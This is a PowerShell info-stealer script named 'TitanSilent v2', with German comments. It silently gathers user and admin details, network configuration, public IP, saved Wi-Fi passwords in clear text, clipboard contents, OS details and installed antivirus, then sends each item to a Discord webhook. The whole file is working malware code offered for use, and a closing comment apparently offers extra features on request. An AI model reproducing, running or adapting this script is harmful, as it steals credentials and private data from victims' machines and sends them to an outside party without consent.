# TitanSilent v2
$webhook = "https://discord.com/api/webhooks/..."  # 👈 dein Webhook
$ErrorActionPreference = "SilentlyContinue"
Add-Type -AssemblyName System.Web

function Send($msg) {
    $json = @{content = $msg} | ConvertTo-Json -Depth 3
    Invoke-RestMethod -Uri $webhook -Method POST -Body $json -ContentType 'application/json'
}

# 🧠 USER INFO
$userInfo = "`n🧠 **User Info**`nUsername: $env:USERNAME`nComputer: $env:COMPUTERNAME`nDomain: $env:USERDOMAIN`nAdmin: $([bool]([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator))"
Send $userInfo

# 🌐 NETWORK
$ip = (Invoke-RestMethod -Uri "https://api.ipify.org?format=json").ip
$net = Get-NetIPConfiguration | Where-Object { $_.IPv4Address -ne $null }
$netInfo = "`n🌐 **Network Info**`nPublic IP: $ip`n"
foreach ($n in $net) {
    $netInfo += "Adapter: $($n.InterfaceAlias)`nIPv4: $($n.IPv4Address.IPAddress)`nGW: $($n.IPv4DefaultGateway.NextHop)`nDNS: $($n.DnsServer.ServerAddresses -join ', ')`n`n"
}
Send $netInfo

# 📡 WLAN KEYS
$profiles = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object { ($_ -split ":")[1].Trim() }
$wifi = "`n📡 **WLAN Keys**`n"
foreach ($p in $profiles) {
    $pw = netsh wlan show profile name="$p" key=clear | Select-String "Key Content" | ForEach-Object { ($_ -split ":")[1].Trim() }
    $wifi += "$p → $pw`n"
}
Send $wifi

# 📋 CLIPBOARD
$clip = Get-Clipboard
if ($clip -ne "") { Send "`n📋 **Clipboard:**`n$clip" }

# 💿 OS INFO
$os = Get-CimInstance Win32_OperatingSystem
$osInfo = "`n💿 **OS Info**`n$($os.Caption) $($os.OSArchitecture)`nInstall: $($os.InstallDate)`nLast Boot: $($os.LastBootUpTime)`nUser: $($os.RegisteredUser)`nBuild: $($os.BuildNumber)"
Send $osInfo

# 🔐 AV Info
$av = Get-CimInstance -Namespace "root\SecurityCenter2" -ClassName "AntivirusProduct"
$avList = ($av.displayName -join ", ")
Send "`n🔐 **Antivirus Detected:**`n$avList"

# 📁 FILE SYSTEM
$files = Get-ChildItem "$env:USERPROFILE\Documents" -Recurse -ErrorAction SilentlyContinue | Measure-Object
Send "`n📁 **User Documents:**`n$($files.Count) files detected in Documents folder."

# (Optional Features nach Wunsch zubuchbar)
